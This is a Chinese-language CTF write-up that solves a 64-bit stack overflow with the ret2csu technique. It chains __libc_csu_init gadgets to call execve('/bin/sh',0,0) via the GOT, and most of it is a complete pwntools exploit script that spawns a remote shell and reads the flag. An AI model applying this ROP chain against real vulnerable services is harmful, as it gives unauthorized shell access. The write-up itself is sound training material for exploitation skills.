# week1pwn6

## 题目简述

程序存在栈溢出，但缺少直接设置全部参数的短 gadget。可以利用 `__libc_csu_init` 中成组的 pop/call gadget 控制 `rdi`、`rsi`、`rdx`，通过 `execve@got` 调用 `execve("/bin/sh", 0, 0)`。

## 解题过程

溢出到返回地址的偏移为 `0x58`。第一段 CSU gadget 依次恢复 `rbx`、`rbp`、`r12`、`r13`、`r14`、`r15`；第二段把其中三个寄存器搬到参数寄存器并执行间接调用。令 `rbx=0`、`rbp=1` 可使调用后通过循环条件，并把 `/bin/sh`、两个 0 和 `execve@got` 放入对应寄存器：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = remote('HOST', PORT)
elf = ELF('./pwn')
gadget1_addr = 0x40130A
gadget2_addr = 0x4012F0
bin_sh_addr = 0x40201D

def com_gadget(addr1, addr2, jmp2, arg1, arg2, arg3):
    payload = (
        p64(addr1) + p64(0) + p64(1) +
        p64(arg1) + p64(arg2) + p64(arg3) +
        p64(jmp2) + p64(addr2) + b'a' * 56
    )
    return payload

payload = (
    b'a' * 0x50 + b'b' * 0x8 +
    com_gadget(
        gadget1_addr,
        gadget2_addr,
        elf.got['execve'],
        bin_sh_addr,
        0,
        0
    )
)
p.sendafter(b'Plz tell me sth : ', payload)
p.sendline(b'cat flag 1>&0')
p.interactive()
~~~

`b'a' * 56` 用于吃掉第二段 gadget 调用后的寄存器恢复和栈空间。进入 shell 后再读取 flag。

## 方法总结

- 核心方法：用 ret2csu 批量控制三个参数寄存器，并经 GOT 间接调用 `execve`。
- 识别特征：64 位 ELF 中缺少足够的独立 pop gadget，但保留了 `__libc_csu_init` 的寄存器恢复与间接调用序列。
- 注意事项：不同编译器版本的 CSU 寄存器对应关系可能不同，必须结合实际汇编确认；还要补齐调用后的栈平衡数据，避免在返回路径崩溃。
